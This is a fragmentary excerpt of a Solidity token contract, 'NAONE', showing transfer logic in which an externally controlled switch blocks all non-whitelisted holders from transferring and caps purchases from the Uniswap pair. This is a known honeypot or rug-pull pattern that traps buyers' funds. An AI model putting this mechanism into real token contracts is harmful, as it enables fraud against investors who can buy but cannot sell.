...
contract SRTOKEN is Context, IERC20, Ownable {
    ...
    string private constant _name = "NAONE";
    string private constant _symbol = "NAONE";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(tokenData.openState()==1 && tokenData.wilteAddress(from)==0){
            require(false ,"Transaction suspension");
        }
        if(tokenData.transOpen()==1 && from==uniswapV2Pair && tokenData.wilteAddress(to)==0){
            require(tokenData.transMaxAmount()>=amount,"quantity excess");
        }
